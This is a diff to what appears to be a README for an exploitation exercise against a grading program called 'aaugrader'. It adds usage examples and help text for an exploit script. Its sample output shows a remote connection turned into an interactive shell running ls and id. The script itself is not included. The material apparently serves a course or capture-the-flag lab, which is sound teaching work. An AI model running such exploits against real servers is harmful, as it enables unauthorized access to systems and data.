@@ -97,3 +97,38 @@ lsfr21:12;12;12;12;12
 magdan21:12;12;12;12;12
 sberge24:02;02;04;07;12
 ```
+
+## Run exploits
+### Examples
+
+```sh
+./exploits/exploit.py -b aaugrader
+```
+
+```sh
+./exploits/exploit.py -s aaugrader.bevster.net -p 8000
+
+[+] Opening connection to aaugrader.bevster.net on port 8000: Done
+[*] Switching to interactive mode
+Username is too long!
+$ ls
+aaugrader
+grades.txt
+run.sh
+$ id
+uid=1001(jens) gid=1001(jens) groups=1001(jens)
+```
+
+
+### Help
+```sh
+usage: exploit.py [-h] [-b BINARY] [-s SERVER] [-p PORT]
+
+AAU GRADER Exploitation Program 3000
+
+options:
+  -h, --help           show this help message and exit
+  -b, --binary BINARY  Specify local binary
+  -s, --server SERVER  Specify server hostname / ip
+  -p, --port PORT      Specify port for server
+```
